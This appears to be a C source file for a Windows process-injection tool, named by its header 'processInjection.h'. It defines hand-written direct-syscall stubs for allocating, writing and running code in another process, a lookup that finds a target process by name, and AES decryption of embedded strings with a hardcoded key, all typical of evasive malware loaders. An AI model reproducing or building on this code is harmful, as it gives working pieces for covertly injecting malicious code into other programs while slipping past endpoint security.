#include "processInjection.h"

_declspec(naked) NTSTATUS _stdcall NtAllocateVirtualMemory(
	IN HANDLE ProcessHandle,
	IN OUT PVOID* BaseAddress,
	IN ULONG ZeroBits,
	IN OUT PSIZE_T RegionSize,
	IN ULONG AllocationType,
	IN ULONG Protect) {
	_asm {

		mov eax, 18h
		call    dword ptr fs : [0xC0]
		retn    18h

	}
}

_declspec(naked) NTSTATUS _stdcall NtOpenProcess(
	OUT PHANDLE ProcessHandle,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN PCLIENT_ID ClientId OPTIONAL) {
	_asm {

		mov eax, 26h
		call    dword ptr fs : [0xC0]
		retn    10h

	}
}

_declspec(naked) NTSTATUS _stdcall NtCreateThreadEx(
	OUT PHANDLE ThreadHandle,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	IN HANDLE ProcessHandle,
	IN PVOID StartRoutine,
	IN PVOID Argument OPTIONAL,
	IN ULONG CreateFlags,
	IN SIZE_T ZeroBits,
	IN SIZE_T StackSize,
	IN SIZE_T MaximumStackSize,
	IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL) {
	_asm {

		mov eax, 0C6h
		call    dword ptr fs : [0xC0]
		retn    2Ch

	}
}


_declspec(naked) NTSTATUS _stdcall NtWriteVirtualMemory(
	IN HANDLE ProcessHandle,
	IN PVOID BaseAddress,
	IN PVOID Buffer,
	IN SIZE_T NumberOfBytesToWrite,
	OUT PSIZE_T NumberOfBytesWritten OPTIONAL) {
	_asm {

		mov eax, 3Ah
		call    dword ptr fs : [0xC0]
		retn    14h

	}
}

DWORD getProcessId(WCHAR* processName) {
	PROCESSENTRY32 processEntry;
	processEntry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	
	if (Process32First(hSnapshot, &processEntry) == true) {
		if (wcscmp(processEntry.szExeFile, processName) == 0) {
			return processEntry.th32ProcessID;
		}

		while(Process32Next(hSnapshot, &processEntry) == true) {
			if (wcscmp(processEntry.szExeFile, processName) == 0) {
				CloseHandle(hSnapshot);
				return processEntry.th32ProcessID;
			}
		}
	}

	CloseHandle(hSnapshot);
	return 0;
}

void decryptString(unsigned char* text, int size) {
	struct AES_ctx ctx;

	uint8_t key[] = "ñdkfmcjeprkjgjll";
	uint8_t iv[] = "bbbbbbbbbbbbbbbb";

	AES_init_ctx_iv(&ctx, key, iv);
	AES_CBC_decrypt_buffer(&ctx, text, size);
}